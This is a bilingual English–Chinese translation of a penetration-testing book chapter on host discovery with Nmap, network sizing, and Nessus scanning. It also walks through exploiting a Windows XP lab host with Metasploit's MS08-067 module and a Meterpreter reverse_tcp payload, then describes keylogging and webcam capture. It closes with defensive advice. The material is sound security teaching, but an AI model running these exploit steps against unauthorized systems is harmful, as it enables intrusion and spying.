- en: Chapter 5. Gaining Access to the Network
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 第5章. 访问网络
- en: Here we are in the fifth chapter! In this chapter, we will be discussing several
    topics relevant to you having access to a network as a wireless penetration tester.
    We will be running assessments on the network to identify hosts, determine network
    size, and detect vulnerability hosts. It is a good idea to know how many hosts
    are on the network when conducting a pentest because you simply do not want to
    leave anything out of your penetration test. Let's begin the chapter by discussing
    why this is important.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 我们来到了第五章！在本章中，我们将讨论一些与您作为无线渗透测试人员访问网络相关的话题。我们将对网络进行评估，以识别主机、确定网络规模和检测易受攻击的主机。在进行渗透测试时，了解网络上有多少主机是一个好主意，因为您绝对不希望漏掉任何内容。让我们开始本章，讨论为什么这很重要。
- en: 'In this chapter, we will discuss the following topics:'
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将讨论以下话题：
- en: Identifying hosts
  id: totrans-3
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 识别主机
- en: Determining network size
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 确定网络规模
- en: Detecting vulnerable hosts
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 检测易受攻击的主机
- en: Preventing against threats
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 防范威胁
- en: If there happens to be a client running Windows 2000 or XP on the network, we
    need to know. The user is fully aware that they are at risk because they are using
    an older version of the Windows operating system. Windows XP can be compromised
    in a matter of minutes! As of April 2014, Microsoft dropped support for Windows
    XP. Windows XP is no longer supported, which means this version of the operating
    system will attract many attackers searching for vulnerabilities. The reason behind
    this is simply because Microsoft will not release any more security patches, so
    if an attacker finds a vulnerability in the system, it will always stay vulnerable.
  id: totrans-7
  prefs: []
  type: TYPE_NORMAL
  zh: 如果网络上有运行Windows 2000或XP的客户端，我们需要知道。用户完全意识到他们处于风险之中，因为他们使用的是较旧版本的Windows操作系统。Windows
    XP可能在几分钟内被攻破！截至2014年4月，微软停止了对Windows XP的支持。Windows XP已不再受支持，这意味着这个操作系统版本将吸引许多寻找漏洞的攻击者。背后的原因很简单，因为微软将不再发布任何安全补丁，所以如果攻击者在系统中发现漏洞，它将永远保持易受攻击状态。
- en: We will be using several networking tools to determine how many hosts are on
    the network, the host's operating system version, the network size, and vulnerable
    hosts. Knowing what is vulnerable on the network and then providing security patches
    or updates will help strengthen the security. Keep in mind, not only do you need
    to know what systems and devices are vulnerable, but also the users in your organization!
  id: totrans-8
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将使用几个网络工具来确定网络上有多少主机、主机的操作系统版本、网络规模和易受攻击的主机。了解网络上的易受攻击部分，然后提供安全补丁或更新将有助于加强安全性。请记住，您不仅需要了解哪些系统和设备易受攻击，还需要了解您组织中的用户！
- en: This is probably one of the biggest security threats that I see. Your staff
    need to undergo a security awareness program to understand what is good and bad
    as well as the do's and don'ts. You could also have staff who are sharing customer
    information outside of work for potential gain. Keep an eye out for any suspicious
    activity that you believe will harm the business.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
  zh: 这可能是我看到的最大的安全威胁之一。您的员工需要接受安全意识培训，了解什么是好的，什么是坏的，以及应该做什么，不应该做什么。您还可能有员工在工作之外分享客户信息以获取潜在利益。请留意任何可能损害业务的可疑活动。
- en: Identifying hosts
  id: totrans-10
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 识别主机
- en: This section is all about the different tools that you can use to identify hosts
    on a network. These tools will provide detailed information on a user's IP address,
    MAC address, open and closed ports, services, operating system, and so on. In
    the following sections you can see a list of tools that Kali Linux has that can
    help identify hosts on a network.
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 本节主要介绍您可以用来识别网络主机的不同工具。这些工具将提供有关用户IP地址、MAC地址、开放和关闭的端口、服务、操作系统等详细信息。在接下来的章节中，您可以看到Kali
    Linux拥有的一些可以帮助识别网络主机的工具列表。
- en: Network mapping tools
  id: totrans-12
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 网络映射工具
- en: 'We will be focusing on Nmap through the command-line interface. Here are some
    alternative tools that can be used to map out networks:'
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将专注于Nmap通过命令行界面。以下是一些可用于绘制网络地图的替代工具：
- en: 0trace
  id: totrans-14
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 0trace
- en: Angry IP Scanner
  id: totrans-15
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Angry IP Scanner
- en: hping2 and hping3
  id: totrans-16
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: hping2和hping3
- en: lanmap and lanmap2
  id: totrans-17
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: lanmap和lanmap2
- en: TCP traceroute
  id: totrans-18
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: TCP路由跟踪
- en: In this demonstration, you will learn how to identify hosts on the network by
    using Nmap. These tools are by far my favorite when it comes to network discovery
    or when you need to know whether a network service is running such as Telnet,
    SSH, or FTP. Let's begin!
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个演示中，您将学习如何使用Nmap来识别网络上的主机。这些工具在网络发现或需要知道网络服务是否运行（如Telnet、SSH或FTP）时是我最喜欢的。让我们开始吧！
- en: Open the Terminal.
  id: totrans-20
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开终端。
- en: 'Type the following command and press *Enter*:'
  id: totrans-21
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入以下命令并按*Enter*键：
- en: '[PRE0]'
  id: totrans-22
  prefs: []
  type: TYPE_PRE
  zh: '[PRE0]'
- en: As you can see in the following screenshot, my private IP address is `192.168.1.5`.
    My gateway happens to be `192.168.1.1` so I will be showing you how to scan the
    entire subnet next.
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 如您在以下截图中所见，我的私人IP地址是`192.168.1.5`。我的网关是`192.168.1.1`，所以下面我将向您展示如何扫描整个子网。
- en: '![Network mapping tools](img/3183OS_05_01.jpg)'
  id: totrans-24
  prefs: []
  type: TYPE_IMG
  zh: '![网络映射工具](img/3183OS_05_01.jpg)'
- en: 'Type the following command and press *Enter*:'
  id: totrans-25
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入以下命令并按*Enter*键：
- en: '[PRE1]'
  id: totrans-26
  prefs: []
  type: TYPE_PRE
  zh: '[PRE1]'
- en: This command will start a ping sweep on all hosts on `192.168.1.1` through `192.168.1.254`.
    When you receive your output, you'll notice some interesting information such
    as open and closed ports, services, and what OS they are running.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 这个命令将在`192.168.1.1`到`192.168.1.254`上的所有主机上启动一个ping扫描。当您收到输出时，您会注意到一些有趣的信息，如开放和关闭的端口、服务以及它们正在运行的操作系统。
- en: This is also a great technique to use if a host has been infected with Conflicker.
    You'll need to learn some of Nmap's command-line switches to do this.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 如果主机感染了Conflicker，这也是一个很好的技术。您需要学习一些Nmap的命令行开关来做到这一点。
- en: 'As you can see in the following screenshot, I was able to detect several systems
    and devices on my local network:'
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 如您在以下截图中所见，我能够检测到我的本地网络上的几个系统和设备：
- en: '![Network mapping tools](img/3183OS_05_02.jpg)'
  id: totrans-30
  prefs: []
  type: TYPE_IMG
  zh: '![网络映射工具](img/3183OS_05_02.jpg)'
- en: 'You can see my Cisco wireless router and the ports that are open and filtered:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: 您可以看到我的思科无线路由器和开放和过滤的端口：
- en: '![Network mapping tools](img/3183OS_05_03.jpg)'
  id: totrans-32
  prefs: []
  type: TYPE_IMG
  zh: '![网络映射工具](img/3183OS_05_03.jpg)'
- en: 'If you happen to have a firewall on the network, you need to run the following
    command:'
  id: totrans-33
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果您在网络上有防火墙，您需要运行以下命令：
- en: '[PRE2]'
  id: totrans-34
  prefs: []
  type: TYPE_PRE
  zh: '[PRE2]'
- en: 'This command will treat all hosts as online and skip host discovery. It is
    used to bypass common filters from firewalls to determine whether the firewall
    is online and is illustrated in the following screenshot:'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: 此命令将所有主机视为在线并跳过主机发现。它用于绕过防火墙的常见过滤器，以确定防火墙是否在线，并在下面的屏幕截图中说明：
- en: '![Network mapping tools](img/3183OS_05_04.jpg)'
  id: totrans-36
  prefs: []
  type: TYPE_IMG
  zh: '![网络映射工具](img/3183OS_05_04.jpg)'
- en: Determining the network size
  id: totrans-37
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 确定网络规模
- en: Determining the network size isn't difficult. It is much easier if you happen
    to have some experience with networking in general. I will provide several steps
    on how to determine the network size and an estimated number of hosts. Let's begin!
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 确定网络规模并不难。如果您对网络有一些经验，那就更容易了。我将提供几个步骤，介绍如何确定网络规模和估计主机数量。让我们开始吧！
- en: Determining the network size in Kali Linux
  id: totrans-39
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 在Kali Linux中确定网络规模
- en: 'In this demonstration, we will be determining the network size in Kali Linux.
    Perform the following steps:'
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 在这个演示中，我们将确定Kali Linux中的网络规模。执行以下步骤：
- en: Open the Terminal.
  id: totrans-41
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 打开终端。
- en: 'Type the following command and press *Enter*:'
  id: totrans-42
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 键入以下命令并按*Enter*：
- en: '[PRE3]'
  id: totrans-43
  prefs: []
  type: TYPE_PRE
  zh: '[PRE3]'
- en: 'The following is the output:'
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是输出：
- en: '![Determining the network size in Kali Linux](img/3183OS_05_05.jpg)'
  id: totrans-45
  prefs: []
  type: TYPE_IMG
  zh: '![确定Kali Linux中的网络规模](img/3183OS_05_05.jpg)'
- en: You will want to scroll up and down to navigate to your network configuration.
    The subnet mask is shown in the preceding screenshot as `255.255.255.0`. If we
    calculate this by doing some subnetting mathematics, we can determine that this
    network could have hosts between 1 and 254.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
  zh: 您需要上下滚动以导航到您的网络配置。子网掩码显示在前面的屏幕截图中为`255.255.255.0`。如果我们通过一些子网计算来计算，我们可以确定这个网络可能有1到254个主机。
- en: You may ask yourself, what does determining the network size have to do with
    penetration testing? Determining the network size helps the penetration tester
    get an estimated amount of hosts on a network. This can help make a penetration
    test easier when knowing the number of networks such as a data center or college
    campus.
  id: totrans-47
  prefs: []
  type: TYPE_NORMAL
  zh: 您可能会问，确定网络规模与渗透测试有什么关系？确定网络规模有助于渗透测试人员估计网络上的主机数量。当知道网络数量时，这可以帮助使渗透测试更容易，比如数据中心或大学校园等。
- en: Detecting vulnerable hosts
  id: totrans-48
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 检测易受攻击的主机
- en: This section is pretty straightforward. If you happen to know someone who doesn't
    update their system on a daily basis, they are most likely vulnerable to the latest
    security threats. As of right now, Windows XP is very unsecure, especially if
    a user doesn't have any updates or service packs installed on their system. In
    the next demonstration, I will be showing you vulnerability within Windows XP.
    Since I do not have a valid copy of Windows 7 or 8 on hand, I cannot demonstrate
    these operating systems.
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
  zh: 这一部分非常简单。如果您碰巧认识一个不每天更新系统的人，他们很可能容易受到最新的安全威胁。截至目前，Windows XP非常不安全，特别是如果用户的系统上没有安装任何更新或服务包。在下一个演示中，我将向您展示Windows
    XP中的漏洞。由于我手头没有有效的Windows 7或8副本，我无法演示这些操作系统。
- en: 'Let''s perform the following steps:'
  id: totrans-50
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们执行以下步骤：
- en: Scan the target to see the services running:![Detecting vulnerable hosts](img/3183OS_05_06.jpg)
  id: totrans-51
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 扫描目标以查看正在运行的服务：![检测易受攻击的主机](img/3183OS_05_06.jpg)
- en: This command enables OS detection, version detection, script scanning, and traceroute.
  id: totrans-52
  prefs: []
  type: TYPE_NORMAL
  zh: 该命令启用操作系统检测、版本检测、脚本扫描和跟踪路由。
- en: Scan for vulnerabilities using Nessus.
  id: totrans-53
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 使用Nessus扫描漏洞。
- en: Note
  id: totrans-54
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: If you are running Nessus for the first time, please note that you will need
    to register Nessus first.
  id: totrans-55
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您是第一次运行Nessus，请注意您需要先注册Nessus。
- en: In the following screenshot, you'll see that we provided the IP address of the
    host we are going to scan for vulnerabilities. The host is running Windows XP
    Professional Service Pack 3.![Detecting vulnerable hosts](img/3183OS_05_07.jpg)
  id: totrans-56
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在下面的屏幕截图中，您将看到我们提供了要扫描漏洞的主机的IP地址。主机正在运行Windows XP专业版Service Pack 3。![检测易受攻击的主机](img/3183OS_05_07.jpg)
- en: As shown in the following screenshot, we are now ready to click on **Launch**
    to start our scan with Nessus:![Detecting vulnerable hosts](img/3183OS_05_08.jpg)
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如下截图所示，我们现在准备好点击**启动**以使用Nessus开始扫描：![检测易受攻击的主机](img/3183OS_05_08.jpg)
- en: After the scan has finished, we need to analyze the report:![Detecting vulnerable
    hosts](img/3183OS_05_09.jpg)
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 扫描完成后，我们需要分析报告：![检测易受攻击的主机](img/3183OS_05_09.jpg)
- en: As you can see in our results, there are several vulnerable services:![Detecting
    vulnerable hosts](img/3183OS_05_10.jpg)
  id: totrans-59
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如您在我们的结果中所见，有几个易受攻击的服务：![检测易受攻击的主机](img/3183OS_05_10.jpg)
- en: If you select one of them and look at the plugin's name, it says `MS08-067`.
    We will be using this later to find our exploit.
  id: totrans-60
  prefs: []
  type: TYPE_NORMAL
  zh: 如果您选择其中一个并查看插件的名称，它会显示`MS08-067`。我们将稍后使用这个来找到我们的漏洞利用程序。
- en: 'Let''s begin to search for our exploit. Start a new Metasploit console using
    the following command:'
  id: totrans-61
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 让我们开始搜索我们的漏洞利用程序。使用以下命令启动新的Metasploit控制台：
- en: '[PRE4]'
  id: totrans-62
  prefs: []
  type: TYPE_PRE
  zh: '[PRE4]'
- en: 'The following screen appears:'
  id: totrans-63
  prefs: []
  type: TYPE_NORMAL
  zh: 出现以下屏幕：
- en: '![Detecting vulnerable hosts](img/3183OS_05_11.jpg)'
  id: totrans-64
  prefs: []
  type: TYPE_IMG
  zh: '![检测易受攻击的主机](img/3183OS_05_11.jpg)'
- en: Note
  id: totrans-65
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
  zh: 注意
- en: Metasploit Framework can be downloaded from [http://www.rapid7.com/products/metasploit/download.jsp](http://www.rapid7.com/products/metasploit/download.jsp).
    Metasploit Framework is an open source attack framework developed by H. D. Moore
    in 2003\. It is used to hack into systems and devices for testing purposes. It
    provides information for those who do penetration testing, IDS signature development,
    and research on exploits.
  id: totrans-66
  prefs: []
  type: TYPE_NORMAL
  zh: Metasploit Framework可以从[http://www.rapid7.com/products/metasploit/download.jsp](http://www.rapid7.com/products/metasploit/download.jsp)下载。Metasploit
    Framework是由H.D. Moore于2003年开发的开源攻击框架。它用于测试目的入侵系统和设备。它为进行渗透测试、IDS签名开发和漏洞研究提供信息。
- en: 'To search for our exploit, type the following:'
  id: totrans-67
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 要搜索我们的漏洞利用程序，请键入以下内容：
- en: '[PRE5]'
  id: totrans-68
  prefs: []
  type: TYPE_PRE
  zh: '[PRE5]'
- en: 'The following is the output:'
  id: totrans-69
  prefs: []
  type: TYPE_NORMAL
  zh: 以下是输出：
- en: '![Detecting vulnerable hosts](img/3183OS_05_12.jpg)'
  id: totrans-70
  prefs: []
  type: TYPE_IMG
  zh: '![检测易受攻击的主机](img/3183OS_05_12.jpg)'
- en: 'Type all of these commands:'
  id: totrans-71
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 输入所有这些命令：
- en: '`use exploit/windows/smb/ms08_067_netapi`: This command sets Metasploit Framework
    to use the exploit `ms08_067_netapi`'
  id: totrans-72
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`use exploit/windows/smb/ms08_067_netapi`:此命令设置Metasploit Framework使用利用`ms08_067_netapi`'
- en: '`set RHOST 192.168.1.30`: This command sets the remote host to the user whom
    you are exploiting'
  id: totrans-73
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`set RHOST 192.168.1.30`:此命令将远程主机设置为您正在利用的用户'
- en: '`set PAYLOAD windows/meterpreter/reverse_tcp`: This command sets the payload
    to `reverse_tcp` so that we can connect back to the host after the exploit was
    successful'
  id: totrans-74
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`set PAYLOAD windows/meterpreter/reverse_tcp`:此命令将有效负载设置为`reverse_tcp`，以便在成功利用后我们可以连接回主机'
- en: '`set LHOST 192.16``8.1.5`: This command sets the local host which is the Kali
    Linux host''s IP address'
  id: totrans-75
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`set LHOST 192.16``8.1.5`:此命令设置本地主机，即Kali Linux主机的IP地址'
- en: '`exploit`: This command launches the exploit in real time so you can see the
    details in action'
  id: totrans-76
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '`exploit`:此命令实时启动利用程序，以便您可以看到详细信息的操作'
- en: 'If you would like to run a different payload, use the command:'
  id: totrans-77
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果您想运行不同的有效负载，请使用以下命令：
- en: '[PRE6]'
  id: totrans-78
  prefs: []
  type: TYPE_PRE
  zh: '[PRE6]'
- en: 'In the following screenshot, we can see the output of the commands we entered
    previously:'
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 在下面的屏幕截图中，我们可以看到我们之前输入的命令的输出：
- en: '![Detecting vulnerable hosts](img/3183OS_05_13.jpg)'
  id: totrans-80
  prefs: []
  type: TYPE_IMG
  zh: '![检测易受攻击的主机](img/3183OS_05_13.jpg)'
- en: 'If done correctly, we should have a Meterpreter shell:'
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 如果操作正确，我们应该有一个Meterpreter shell：
- en: '![Detecting vulnerable hosts](img/3183OS_05_14.jpg)'
  id: totrans-82
  prefs: []
  type: TYPE_IMG
  zh: '![检测易受攻击的主机](img/3183OS_05_14.jpg)'
- en: Meterpreter shell is a completely separate environment between you and the exploited
    host. It is not required to run but it is more of a proof of concept than anything
    else. You can execute programs, batch scripts; navigate through the system hierarchy,
    hashdump, network configuration; and even take a snapshot from the webcam. So
    what would happen if someone was able to get a Meterpreter session on you? They
    could create a backdoor to the system and gain administrative rights.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: Meterpreter shell是您和被利用主机之间完全独立的环境。它不是必需运行的，而更多是一个概念的证明。您可以执行程序、批处理脚本；浏览系统层次结构、hashdump、网络配置；甚至从网络摄像头中拍摄快照。那么如果有人能够在您身上获得一个Meterpreter会话会发生什么？他们可以在系统中创建后门并获得管理员权限。
- en: Congratulations! We have successfully detected and exploited a vulnerable host
    over a wireless network. From here, we could look up running processes on the
    target system, take screenshots, record keystrokes, or even view attached webcams.
    Meterpreter is a very powerful shell. Be sure to take some time to get a good
    look at it.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 恭喜！我们已成功在无线网络上检测和利用了一个易受攻击的主机。从这里，我们可以查看目标系统上运行的进程，截取屏幕截图，记录按键，甚至查看连接的网络摄像头。Meterpreter是一个非常强大的shell。一定要花些时间好好研究一下它。
- en: '![Detecting vulnerable hosts](img/3183OS_05_15.jpg)'
  id: totrans-85
  prefs: []
  type: TYPE_IMG
  zh: '![检测易受攻击的主机](img/3183OS_05_15.jpg)'
- en: Preventing against threats
  id: totrans-86
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 防范威胁
- en: We always need to know how to protect ourselves from these threats and attacks.
    Next, I will be discussing how to protect yourself from these attacks.
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 我们总是需要知道如何保护自己免受这些威胁和攻击。接下来，我将讨论如何保护自己免受这些攻击。
- en: Preventing the identification of hosts
  id: totrans-88
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 防止主机的识别
- en: To protect yourself from threats and risks, small and large businesses should
    have a hardware firewall such as the WatchGuard XTM or Cisco ASA with custom rules
    to block services and ports that are not in use. The services that aren't in use
    should also be disabled from the server or network device to prevent any unauthorized
    access. Intrusion detection systems with alerting enabled for SMS or e-mail. Firewall
    should be logging protocols and flagging alerts.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 为了保护自己免受威胁和风险，小型和大型企业应该拥有硬件防火墙，如WatchGuard XTM或Cisco ASA，并使用自定义规则来阻止未使用的服务和端口。未使用的服务也应该从服务器或网络设备中禁用，以防止任何未经授权的访问。入侵检测系统应启用短信或电子邮件的警报功能。防火墙应记录协议并标记警报。
- en: If the firewall or IDS is not monitored, then how would you know if your organization
    was compromised? Daily monitoring is very important to stay ahead of your threats
    and risks that are available on the outside network. Separate your networks from
    each other using VLANs. The servers, workstations, VoIP, and wireless should have
    their own VLAN to keep the network isolated from network infections and compromise.
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: 如果防火墙或IDS没有受到监控，那么您怎么知道您的组织是否受到了损害？每天的监控非常重要，以便及时应对外部网络上存在的威胁和风险。使用VLAN将网络彼此隔离。服务器、工作站、VoIP和无线设备应该有自己的VLAN，以防止网络感染和妥协。
- en: Preventing others from determining your network size
  id: totrans-91
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 防止他人确定您的网络规模
- en: When determining network size, you should always encrypt any sensitive information
    such as network diagrams, passwords, logs, workstation and server information,
    and configuration settings. A hardware firewall such as WatchGuard XTM or Cisco
    ASA are a great for both small and large businesses to control traffic by blocking
    ICMP and only allowing traffic from trusted sources.
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 在确定网络规模时，您应始终加密任何敏感信息，例如网络图表、密码、日志、工作站和服务器信息以及配置设置。WatchGuard XTM或Cisco ASA等硬件防火墙非常适合小型和大型企业，可以通过阻止ICMP来控制流量，并只允许来自受信任来源的流量。
- en: Protection of vulnerable hosts
  id: totrans-93
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 保护易受攻击的主机
- en: To protect your systems and network devices from exploitation, install the latest
    security patches provided by your vendors. Install the latest operating system
    and software updates when they are available. If you run into conflicts when upgrading,
    report the issue to your software vendor. Use the strongest wireless encryption
    WPA2 with AES encryption algorithm with a complex passphrase. Run a real-time
    antivirus scanner with the latest virus definitions on all of your workstations
    and servers. Provide security awareness training to staff members.
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 为了保护系统和网络设备免受利用，安装供应商提供的最新安全补丁。在可用时安装最新的操作系统和软件更新。如果在升级时遇到冲突，请向软件供应商报告问题。使用最强大的无线加密WPA2和AES加密算法以及复杂的密码。在所有工作站和服务器上运行具有最新病毒定义的实时防病毒扫描程序。为员工提供安全意识培训。
- en: Summary
  id: totrans-95
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: Wow! We completed three demonstrations in this chapter! I hope you enjoyed the
    demonstrations as much as I did. This chapter was a lot of fun and interesting
    for the both of us. Let's take a few moments to look back at what you learned.
  id: totrans-96
  prefs: []
  type: TYPE_NORMAL
  zh: 哇！在这一章中我们完成了三次演示！我希望你和我一样享受这些演示。这一章对我们来说非常有趣和有意思。让我们花点时间回顾一下你学到了什么。
- en: In this chapter, we discussed why it is important to find the number of live
    hosts when conducting a penetration test on a network. Next, we demonstrated identifying
    hosts on the network with Kali Linux. Then, we demonstrated determining network
    size and explained why it is important to understand as a penetration tester.
    We finished the chapter by demonstrating detecting vulnerabilities in Windows
    XP using the Nessus vulnerability scanner and listed several preventions that
    could help reduce risk.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 在这一章中，我们讨论了在进行网络渗透测试时找到活跃主机数量的重要性。接下来，我们演示了如何使用Kali Linux识别网络上的主机。然后，我们演示了确定网络规模，并解释了作为渗透测试人员理解这一点的重要性。最后，我们演示了使用Nessus漏洞扫描器检测Windows
    XP中的漏洞，并列出了一些可以帮助减少风险的预防措施。
- en: In the next chapter, we will cover how to plan a vulnerability assessment, configure
    the Nessus vulnerability scanner, run the Nessus vulnerability scanner, and patch
    vulnerabilities. I'm quite sure you are just as excited as I am. Let's move on
    to to the next chapter!
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将介绍如何规划漏洞评估、配置Nessus漏洞扫描器、运行Nessus漏洞扫描器以及修补漏洞。我相信你和我一样都很兴奋。让我们继续下一章吧！
